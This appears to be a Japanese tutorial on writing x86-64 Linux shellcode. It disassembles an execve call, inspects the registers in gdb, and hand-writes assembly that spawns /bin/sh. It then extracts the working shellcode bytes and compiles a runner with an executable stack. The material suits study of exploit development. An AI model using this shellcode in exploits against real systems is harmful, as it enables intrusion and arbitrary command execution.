# 元となるC言語コードをビルドする

```
$ gcc -static execve.c
```

# 逆アセンブル

## main関数

```
$ objdump -M intel -d a.out | sed -n '/<main>:/,/^$/p'
000000000040105e <main>:
  40105e:       55                      push   rbp
  40105f:       48 89 e5                mov    rbp,rsp
  401062:       48 83 ec 10             sub    rsp,0x10
  401066:       48 c7 45 f0 44 35 49    mov    QWORD PTR [rbp-0x10],0x493544
  40106d:       00
  40106e:       48 c7 45 f8 00 00 00    mov    QWORD PTR [rbp-0x8],0x0
  401075:       00
  401076:       48 8b 45 f0             mov    rax,QWORD PTR [rbp-0x10]
  40107a:       48 8d 4d f0             lea    rcx,[rbp-0x10]
  40107e:       ba 00 00 00 00          mov    edx,0x0
  401083:       48 89 ce                mov    rsi,rcx
  401086:       48 89 c7                mov    rdi,rax
  401089:       e8 72 24 03 00          call   433500 <__execve>
  40108e:       c9                      leave
  40108f:       c3                      ret
```


## execve関数

```
$ objdump -M intel -d a.out | sed -n '/<__execve>:/,/^$/p'
0000000000433500 <__execve>:
  433500:       b8 3b 00 00 00          mov    eax,0x3b
  433505:       0f 05                   syscall
  433507:       48 3d 00 f0 ff ff       cmp    rax,0xfffffffffffff000
  43350d:       77 02                   ja     433511 <__execve+0x11>
  43350f:       f3 c3                   repz ret
  433511:       48 c7 c2 c0 ff ff ff    mov    rdx,0xffffffffffffffc0
  433518:       f7 d8                   neg    eax
  43351a:       64 89 02                mov    DWORD PTR fs:[rdx],eax
  43351d:       48 83 c8 ff             or     rax,0xffffffffffffffff
  433521:       c3                      ret
  433522:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
  433529:       00 00 00
  43352c:       0f 1f 40 00             nop    DWORD PTR [rax+0x0]
```


## 分析

```
=> 0x433505 <execve+5>: syscall
(gdb) info registers
rax            0x3b     59
rbx            0x4002b0 4194992
rcx            0x7fffffffe3f0   140737488348144
rdx            0x0      0
rsi            0x7fffffffe3f0   140737488348144
rdi            0x493544 4797764
rbp            0x7fffffffe400   0x7fffffffe400
rsp            0x7fffffffe3e8   0x7fffffffe3e8
r8             0x3      3
r9             0x4      4
r10            0x14     20
r11            0x1      1
r12            0x0      0
r13            0x401700 4200192
r14            0x401790 4200336
r15            0x0      0
rip            0x433505 0x433505 <execve+5>
eflags         0x206    [ PF IF ]
cs             0x33     51
ss             0x2b     43
ds             0x0      0
es             0x0      0
fs             0x63     99
gs             0x0      0
```


### レジスタの状態

上記から、以下の状態で`syscall`を実行すれば良いことがわかる

```
EAX  0x3b
RDI  0x493544        = "/bin/sh" へのポインタ
RSI  0x7fffffffe3f0  = 0x00493544 へのポインタ
RDX  0x0
R10  0x14
R8   0x3
R9   0x4
```


# アセンブリコードを書いてみる

```
        /* execve.s */
        .intel_syntax noprefix
        .globl _start
_start:
        xor  rdx, rdx
        push rdx
        mov  rax,0x68732f2f6e69622f /* "/bin//sh" */
        push rax
        mov  rdi, rsp
        push rdx
        push rdi
        mov  rsi, rsp
        mov  eax, 0x3b
        mov  r10, 0x14
        mov  r8, 0x3
        mov  r9, 0x4
        syscall
```


# 完成アセンブリコード

```
        /* execve.s */
        .intel_syntax noprefix
        .globl _start
_start:
        xor  rdx, rdx
        push rdx
        mov  rax, 0x68732f2f6e69622f
        push rax
        mov  rdi, rsp
        push rdx
        push rdi
        mov  rsi, rsp
        lea  rax, [rdx+0x3b]
        syscall
```

## シェルコード生成

```
$ gcc -nostdlib execve.s
$ objdump -M intel -d a.out | grep '^ ' | c ut -f2 | perl -pe 's/(\w{2})\s+/\\x\1/g'
\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05
```

# シェルコード実行ソースコード ビルド

```
$ gcc -z execstack shell.c
```


# 参考

  * [Linux x86用のシェルコードを書いてみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/03/13/013056)
